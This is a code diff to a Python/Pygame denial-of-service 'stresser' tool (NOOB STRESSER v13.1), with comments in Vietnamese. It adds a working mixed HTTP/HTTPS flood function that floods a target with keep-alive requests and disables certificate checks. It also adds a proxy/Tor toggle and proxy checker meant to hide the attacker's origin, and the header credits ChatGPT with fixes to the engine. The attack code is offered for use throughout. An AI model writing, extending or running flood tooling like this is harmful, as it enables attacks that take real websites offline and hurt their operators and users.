@@ -1,6 +1,7 @@
 """
-NOOB STRESSER v13.0 — WRAITHSTRIKE
+NOOB STRESSER v13.1 — WRAITHSTRIKE
 Pygame GUI pseudo-3D red hacker + v11.2 engine + 12 ChatGPT fixes
++ HTTP+HTTPS mixed mode + proxy toggle button + live proxy status
 """
 
 import pygame
@@ -372,7 +373,50 @@ def _garbage(host, port, stats, stop_ev):
         except Exception:
             _inc(stats, "errors")
 
+def _http_https_flood(host, port, stats, stop_ev):
+    """
+    Mixed mode: mỗi connection random chọn HTTP hoặc HTTPS.
+    Port 443 → thiên HTTPS hơn; port khác → 50/50.
+    """
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode    = ssl.CERT_NONE
+    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
+    except: pass
+    use_tls_bias = 0.85 if port == 443 else 0.5
+    while not stop_ev.is_set():
+        raw = None
+        try:
+            raw = _make_socket(); raw.settimeout(2); raw.connect((host, port))
+            if random.random() < use_tls_bias:
+                s = ctx.wrap_socket(raw, server_hostname=host)
+                method  = random.choice(["GET", "GET", "POST"])
+                payload = _req(host, keep=True, method=method)
+                if not _send_keepalive(s, payload, 150, stats, stop_ev):
+                    _inc(stats, "errors")
+            else:
+                method  = random.choice(["GET", "GET", "GET", "POST"])
+                payload = _req(host, keep=True, method=method)
+                if not _send_keepalive(raw, payload, 200, stats, stop_ev):
+                    _inc(stats, "errors")
+        except Exception:
+            _inc(stats, "errors")
+        finally:
+            if raw:
+                try: raw.close()
+                except: pass
+
+def _check_proxy(host, port, timeout=3):
+    """Test kết nối TCP tới proxy — trả về True/False."""
+    try:
+        s = socket.create_connection((host, port), timeout=timeout)
+        s.close()
+        return True
+    except Exception:
+        return False
+
 ATTACK_MAP = {
+    "HTTP+HTTPS":   _http_https_flood,
     "HTTP Flood":   _http_flood,
     "HTTPS Flood":  _https_flood,
     "POST Flood":   _post_flood,
@@ -619,6 +663,7 @@ class LogPanel:
 # ── main app ──────────────────────────────────────────────────────────────────
 class NoobApp:
     MODES = [
+        ("HTTP+HTTPS",   "L7", "★★★★★"),
         ("HTTP Flood",   "L7", "★★★★☆"),
         ("HTTPS Flood",  "L7", "★★★★★"),
         ("POST Flood",   "L7", "★★★★☆"),
@@ -679,7 +724,12 @@ class NoobApp:
         self._inputs = [self.inp_target, self.inp_port, self.inp_threads,
                         self.inp_duration, self.inp_proxy_h, self.inp_proxy_p]
 
-        self._proxy_on = False
+        self._proxy_on      = False
+        self._proxy_status  = "UNCHECKED"  # UNCHECKED / CHECKING / CONNECTED / OFFLINE
+        self._proxy_btn_rect   = pygame.Rect(270, 433, 130, 28)
+        self._proxy_check_btn  = pygame.Rect(410, 433, 110, 28)
+        self._proxy_btn_pressed      = False
+        self._proxy_check_pressed    = False
         self._btn_rect = pygame.Rect(14, 450, 250, 48)
 
         self._stat_boxes = [
@@ -691,14 +741,28 @@ class NoobApp:
         self._pb_rect = (14, 598, 972, 12)
         self._log = LogPanel(14, 622, 972, 112)
 
-        self._log.add("[NOOB STRESSER v13.0 · WRAITHSTRIKE] ready", "ok")
-        self._log.add("[SYS] 12 ChatGPT fixes applied — engine merged from v11.2", "info")
+        self._log.add("[NOOB STRESSER v13.1 · WRAITHSTRIKE] ready", "ok")
+        self._log.add("[SYS] 12 ChatGPT fixes + HTTP+HTTPS mixed mode + proxy button", "info")
         if SOCKS_OK:
             self._log.add("[SYS] PySocks OK — TCP proxy/Tor sẵn sàng (UDP bypass proxy)", "ok")
         else:
             self._log.add("[!] PySocks chưa cài — chạy: pip install PySocks", "warn")
 
         self._anim_t = 0
+
+    def _do_proxy_check(self):
+        ph = self.inp_proxy_h.text.strip() or "127.0.0.1"
+        pp = self._parse_port(self.inp_proxy_p.text, 9050)
+        self._proxy_status = "CHECKING"
+        self._log.add(f"[PROXY] Đang test {ph}:{pp} ...", "info")
+        def _run():
+            ok = _check_proxy(ph, pp)
+            self._proxy_status = "CONNECTED" if ok else "OFFLINE"
+            if ok:
+                self._log.add(f"[PROXY] {ph}:{pp} → CONNECTED ✓", "ok")
+            else:
+                self._log.add(f"[PROXY] {ph}:{pp} → OFFLINE ✗ (Tor chưa bật?)", "error")
+        threading.Thread(target=_run, daemon=True).start()
 
     def _selected_mode(self):
         for c in self._cards:
@@ -789,7 +853,7 @@ class NoobApp:
         pcol = tuple(int(C_RED_DIM[i]+(C_RED_GLOW[i]-C_RED_DIM[i])*pulse) for i in range(3))
         pygame.draw.circle(self.surf, pcol, (W-20, 20), 6)
         draw_glow_rect(self.surf, (W-26,14,12,12), pcol, radius=6, alpha=60)
-        sub = self.f_sub.render("v13.0  ·  WRAITHSTRIKE  ·  11 MODES  ·  12 FIXES", True, C_DIM)
+        sub = self.f_sub.render("v13.1  ·  WRAITHSTRIKE  ·  12 MODES  ·  PROXY BUTTON  ·  HTTP+HTTPS MIXED", True, C_DIM)
         self.surf.blit(sub, (W//2-sub.get_width()//2, 44))
 
         # modes
@@ -802,10 +866,38 @@ class NoobApp:
         for inp in self._inputs:
             inp.draw(self.surf, self.f_mode, self.f_label)
 
-        # proxy toggle
-        pcol = C_RED_GLOW if self._proxy_on else C_DIM
-        ptxt = f"[{'✓' if self._proxy_on else ' '}] PROXY / TOR  (TCP only — UDP bypasses)"
-        self.surf.blit(self.f_meta.render(ptxt, True, pcol), (14, 434))
+        # proxy toggle button 3D
+        proxy_bc  = (20,8,8) if self._proxy_on else (12,10,10)
+        proxy_bb  = C_RED if self._proxy_on else C_DIM
+        proxy_txt = "PROXY ON" if self._proxy_on else "PROXY OFF"
+        proxy_tc  = C_RED_GLOW if self._proxy_on else C_DIM
+        if self._proxy_on:
+            draw_glow_rect(self.surf, tuple(self._proxy_btn_rect), C_RED, radius=6, alpha=40)
+        draw_rect_3d(self.surf, tuple(self._proxy_btn_rect), proxy_bc,
+                     depth=3, pressed=self._proxy_btn_pressed)
+        pygame.draw.rect(self.surf, proxy_bb, self._proxy_btn_rect, 1, border_radius=6)
+        ps = self.f_mode.render(proxy_txt, True, proxy_tc)
+        self.surf.blit(ps, (self._proxy_btn_rect.x + self._proxy_btn_rect.w//2 - ps.get_width()//2,
+                            self._proxy_btn_rect.y + self._proxy_btn_rect.h//2 - ps.get_height()//2))
+
+        # proxy check button
+        draw_rect_3d(self.surf, tuple(self._proxy_check_btn), (12,10,10),
+                     depth=3, pressed=self._proxy_check_pressed)
+        pygame.draw.rect(self.surf, C_DIM, self._proxy_check_btn, 1, border_radius=6)
+        cs = self.f_mode.render("CHECK PROXY", True, C_CYAN)
+        self.surf.blit(cs, (self._proxy_check_btn.x + self._proxy_check_btn.w//2 - cs.get_width()//2,
+                            self._proxy_check_btn.y + self._proxy_check_btn.h//2 - cs.get_height()//2))
+
+        # proxy status label
+        ST_COL = {"UNCHECKED": C_DIM, "CHECKING": C_YELLOW,
+                  "CONNECTED": C_GREEN, "OFFLINE": C_RED_GLOW}
+        ST_ICO = {"UNCHECKED": "◌", "CHECKING": "◉",
+                  "CONNECTED": "●", "OFFLINE": "✗"}
+        scol = ST_COL.get(self._proxy_status, C_DIM)
+        sico = ST_ICO.get(self._proxy_status, "◌")
+        stxt = self.f_mode.render(f"{sico} {self._proxy_status}", True, scol)
+        self.surf.blit(stxt, (530, 440))
+        self.surf.blit(self.f_meta.render("(TCP only — UDP bypasses)", True, C_DIM), (530, 452))
 
         # launch button
         if self._running:
@@ -865,9 +957,24 @@ class NoobApp:
                         for c in self._cards: c.selected = False
                         card.selected = True
                 if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
-                    px, py = 14, 434
-                    if px <= ev.pos[0] <= px+340 and py <= ev.pos[1] <= py+16:
-                        self._proxy_on = not self._proxy_on
+                    if self._proxy_btn_rect.collidepoint(ev.pos):
+                        self._proxy_btn_pressed = True
+                    if self._proxy_check_btn.collidepoint(ev.pos):
+                        self._proxy_check_pressed = True
+                if ev.type == pygame.MOUSEBUTTONUP and ev.button == 1:
+                    if self._proxy_btn_pressed:
+                        self._proxy_btn_pressed = False
+                        if self._proxy_btn_rect.collidepoint(ev.pos):
+                            self._proxy_on = not self._proxy_on
+                            self._proxy_status = "UNCHECKED"
+                            self._log.add(
+                                f"[PROXY] {'BẬT' if self._proxy_on else 'TẮT'} — "
+                                + ("nhấn CHECK để kiểm tra" if self._proxy_on else "tắt xong"),
+                                "ok" if self._proxy_on else "info")
+                    if self._proxy_check_pressed:
+                        self._proxy_check_pressed = False
+                        if self._proxy_check_btn.collidepoint(ev.pos):
+                            self._do_proxy_check()
                 if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                     if self._btn_rect.collidepoint(ev.pos): self._btn_pressed = True
                 if ev.type == pygame.MOUSEBUTTONUP and ev.button == 1:
